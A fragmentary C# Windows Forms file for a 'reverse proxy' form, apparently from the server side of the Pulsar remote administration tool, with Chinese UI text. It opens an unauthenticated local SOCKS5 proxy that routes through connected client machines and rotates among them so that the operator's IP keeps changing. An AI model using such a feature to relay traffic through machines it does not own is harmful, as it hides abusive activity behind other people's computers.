...
namespace Pulsar.Server.Forms
{
    public partial class FrmReverseProxy : Form
    {
        ...
        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            ...
            {
                this.Text = "反向代理 [负载均衡已启用]";
                lblLoadBalance.Text = "负载均衡已启用，将使用 " + _clients.Length + " 个客户端作为代理\r\n请持续刷新 www.ipchicken.com 查看您的 IP 地址是否不断变化，如果是，说明已生效";
            }
            else if (_clients.Length == 1)
            {
                this.Text = WindowHelper.GetWindowTitle("反向代理", _clients[0]);
                lblLoadBalance.Text = "负载均衡未启用，仅使用 1 个客户端，请选择多个客户端以启用负载均衡";
            }
        ...
        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                if (port == 0)
                {
                    MessageBox.Show("请输入有效的端口号（大于 0）。", "请输入有效的端口", MessageBoxButtons.OK,
            ...
            catch (SocketException ex)
            {
                ...
                {
                    MessageBox.Show("该端口已被占用。", "监听错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
        ...
        {
            lblProxyInfo.Text = string.Format("连接到此 SOCKS5 代理: 127.0.0.1:{0}（无需用户名/密码）", nudServerPort.Value);
        }
